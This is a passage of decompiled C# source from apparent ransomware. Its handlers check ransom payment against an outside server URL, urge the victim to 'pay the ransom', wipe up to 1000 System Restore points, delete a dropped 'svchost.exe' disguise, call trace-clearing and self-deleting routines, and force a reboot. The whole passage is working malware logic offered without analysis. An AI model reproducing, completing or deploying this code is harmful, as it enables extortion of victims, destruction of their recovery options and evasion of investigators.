		}
	}

	private void BackgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Files decrypted! Please restart your PC in order to get back to normal.", (MsgBoxStyle)0, (object)null);
		Process.GetCurrentProcess().Kill();
	}

	private void Label6_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Jakub).Show();
	}

	private void NsButton2_Click(object sender, EventArgs e)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		WebClient webClient = new WebClient();
		string text = webClient.DownloadString("http://vreaucoduripentrujocuri.com/script.php?check=" + NsTextBox1.Text.ToString());
		if (Operators.CompareString(text, "NotPaid", false) == 0)
		{
			Interaction.MsgBox((object)"Click \"Go To The Website\" and pay the ransom!", (MsgBoxStyle)0, (object)null);
			NsTextBox2.set_Text("Still Not Paid!");
		}
		else if (Operators.CompareString(text, "Paid", false) == 0)
		{
			NsTextBox2.set_Text("Paid! Wait for decrypt!");
			((Control)NsGroupBox2).set_Visible(false);
			((Control)NsGroupBox3).set_Visible(false);
			((Control)Label6).set_Visible(false);
			((Control)Label7).set_Visible(false);
			((Control)NsGroupBox1).set_Visible(false);
			((Control)Label5).set_Visible(false);
			((Control)Label4).set_Visible(false);
			((Control)NsTextBox2).set_Visible(false);
			((Control)Label9).set_Visible(false);
			((Control)Label10).set_Visible(false);
			((Control)NsTextBox1).set_Visible(false);
			((Control)NsButton2).set_Visible(false);
			((Control)this).set_Enabled(false);
			try
			{
				RemoveValue(Application.get_ProductName());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			BackgroundWorker1.RunWorkerAsync();
			melt(1);
		}
	}

	private void BackgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
	{
		try
		{
			int num = 0;
			do
			{
				int index = num;
				SRRemoveRestorePoint(index);
				num = checked(num + 1);
			}
			while (num <= 1000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void BackgroundWorker2_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		((Control)Label15).set_Visible(false);
		((Control)Label14).set_Visible(true);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		FuckPc();
		((Control)Label23).set_Visible(true);
		((Control)NsGroupBox2).set_Visible(false);
		((Control)NsGroupBox3).set_Visible(false);
		((Control)Label6).set_Visible(false);
		((Control)Label7).set_Visible(false);
		((Control)NsGroupBox1).set_Visible(false);
		((Control)Label5).set_Visible(false);
		((Control)Label4).set_Visible(false);
		((Control)NsTextBox2).set_Visible(false);
		((Control)Label9).set_Visible(false);
		((Control)Label10).set_Visible(false);
		((Control)NsTextBox1).set_Visible(false);
		((Control)NsButton2).set_Visible(false);
		((Control)this).set_Enabled(false);
		BackgroundWorker3.RunWorkerAsync();
	}

	private void BackgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1500);
	}

	private void BackgroundWorker3_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\data.bin");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(folderPath + "\\svchost.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ClearTrace();
		Process.GetCurrentProcess().Kill();
		Interaction.Shell("Shutdown -r -f", (AppWinStyle)2, false, -1);
	}

	private void NsSeperator1_Click(object sender, EventArgs e)
	{
	}

	private void NsTheme1_Click(object sender, EventArgs e)
	{
	}
}
